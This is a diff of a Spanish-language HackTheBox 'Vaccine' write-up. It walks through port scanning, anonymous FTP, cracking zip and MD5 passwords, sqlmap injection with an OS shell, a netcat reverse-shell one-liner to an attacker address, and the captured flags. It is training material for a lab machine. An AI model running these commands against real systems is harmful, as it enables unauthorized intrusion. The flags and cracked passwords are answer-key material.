@@ -1,46 +1,37 @@
 # Vaccine
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 27 de diciembre de 2024 16:56
-IP: 10.129.249.41
+Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 27 de diciembre de 2024 16:56 IP: 10.129.249.41
 
 ## Recopilación de información
 
-<aside>
 💡 Reconocimiento inicial de la maquina
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.249.41 -oG allports
 ```
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 ### **Enumeración de servicios**
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
-Buscamos con los scrips de reconocimiento las versiones 
+Buscamos con los scrips de reconocimiento las versiones
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
-- **Identificación de vulnerabilidades**
-    - 21 / FTP :  vsftpd 3.0.3
-    
+*   **Identificación de vulnerabilidades**
+
+    * 21 / FTP : vsftpd 3.0.3
+
     ```bash
     21/tcp open  ftp     vsftpd 3.0.3
     | ftp-syst: 
@@ -59,23 +50,23 @@ Buscamos con los scrips de reconocimiento las versiones
     | ftp-anon: Anonymous FTP login allowed (FTP code 230)
     |_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
     ```
-    
+
     Enumeramos el servidor FTP. Vemos que permite conexión “anonymous” . Descargamos fichero backup.zip
-    
+
     ```bash
     get backup.zip
     ```
-    
+
     Descomprimimos el fichero : Nos pide password para el archivo.
-    
+
     ```bash
     ❯ unzip backup.zip
     Archive:  backup.zip
     [backup.zip] index.php password: %       
     ```
-    
+
     Con Zip2Johb sacamos el hash para crackear el password con John:
-    
+
     ```bash
     zip2john backup.zip > zip.hash
     john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
@@ -87,13 +78,13 @@ Buscamos con los scrips de reconocimiento las versiones
     1g 0:00:00:00 DONE (2024-12-27 17:18) 25.00g/s 204800p/s 204800c/s 204800C/s 123456..whitetiger
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed. 
-    
+
     ```
-    
+
     Password: **741852963**
-    
+
     Descomprimimos el fichero y buscamos dentro del fichero “index.php” credenciales de usaurio:
-    
+
     ```bash
     cat index.php | grep password
       if(isset($_POST['username']) && isset($_POST['password'])) {
@@ -101,13 +92,13 @@ Buscamos con los scrips de reconocimiento las versiones
             <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
             <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
     ```
-    
-    Username  : admin
-    
+
+    Username : admin
+
     Password: 2cb42f8734ea607eefed3b70af13bbd3
-    
+
     Parece un password en hash md5. Provamos de descifrar el hash con hashcat:
-    
+
     ```bash
     hashcat 2cb42f8734ea607eefed3b70af13bbd3 -m 0 /usr/share/wordlists/rockyou.txt
     Dictionary cache built:
@@ -116,69 +107,69 @@ Buscamos con los scrips de reconocimiento las versiones
     * Bytes.....: 139921507
     * Keyspace..: 14344385
     * Runtime...: 3 secs
-    
+
     2cb42f8734ea607eefed3b70af13bbd3:qwerty789 
-    
+
     ```
-    
-    Password: **qwerty789** 
-    
-    Enumeramos la web 
-    
-    ![image.png](/images/HackTheBox/image%202.png)
-    
+
+    Password: **qwerty789**
+
+    Enumeramos la web
+
+    ![image.png](<../../.gitbook/assets/image 2 (1).png>)
+
     Probamos a buscar con SQLMap si es vulenrable a SQLInjections:
-    
+
     Enumeramos las tablas
-    
+
     ```bash
     sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --tables
     ```
-    
+
     Enumeramos usuarios
-    
+
     ```bash
     ❯ sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --users
-    
+
     database management system users [1]:
     [*] postgres
     ```
-    
+
     Con “ - - os- shell” podemos ejecutar comandos en la bd y ver los usuarios:
-    
+
     ```bash
-    
+
     sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --os-shell
-    
+
     os-shell> whoami
     do you want to retrieve the command standard output? [Y/n/a] y
     [18:22:19] [INFO] retrieved: 'postgres'
     ```
-    
+
     Buscamos los passwords con :
-    
+
     ```bash
     sqlmap -u 'http://10.129.249.41/dashboard.php?search=1' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1" --passwords --batch
-    
+
     database management system users password hashes:
     [*] postgres [1]:
         password hash: md52d58e0637ec1e94cdfba3d1c26b67d01
     ```
-    
+
     Vemos que es un MD5, probamos con hashcat:
-    
+
     ```bash
     hashcat 2d58e0637ec1e94cdfba3d1c26b67d01 -m 0 /usr/share/wordlist/rockyou.txt
     ```
-    
+
     No encuentra nada, por lo que buscamos el hash en [hashes.com](http://hashes.com) y encontramos :
-    
+
     Hash :2d58e0637ec1e94cdfba3d1c26b67d01
-    
+
     Password: **P@s5w0rd!postgres**
-    
-    - 80 / TCP : Apache httpd 2.4.41 ((Ubuntu))
-    
+
+    * 80 / TCP : Apache httpd 2.4.41 ((Ubuntu))
+
     ```bash
     80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
     |_http-server-header: Apache/2.4.41 (Ubuntu)
@@ -188,9 +179,9 @@ Buscamos con los scrips de reconocimiento las versiones
     |     PHPSESSID: 
     |_      httponly flag not set
     ```
-    
-    - 22/SSH : OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-    
+
+    * 22/SSH : OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+
     ```bash
     22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
     | ssh-hostkey: 
@@ -198,14 +189,10 @@ Buscamos con los scrips de reconocimiento las versiones
     |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
     |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
     ```
-    
 
 ## Explotación
 
-<aside>
 💡
-
-</aside>
 
 ### Explotación 1
 
@@ -217,9 +204,9 @@ os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.140 4444 >
 
 Obtenemos revershell:
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 Miramos que hay en la parte de la web:
 
@@ -241,10 +228,7 @@ User.txt: **ec9b13ca4d6229cd5cc1e09980965bf7**
 
 ## Explotación posterior
 
-<aside>
 💡 Probamos a buscar privilegios
-
-</aside>
 
 ### Escalada de privilegios
 
@@ -280,7 +264,4 @@ Root.txt: **dd6e058e814260bc70e9bbdef2715849**
 
 ## Conclusión
 
-<aside>
 💡 Maquina facil. Aprendemos comandos SQLMap. Tener presente tema cookie para identificarse antes de enumerar. Escalada sencilla.
-
-</aside>
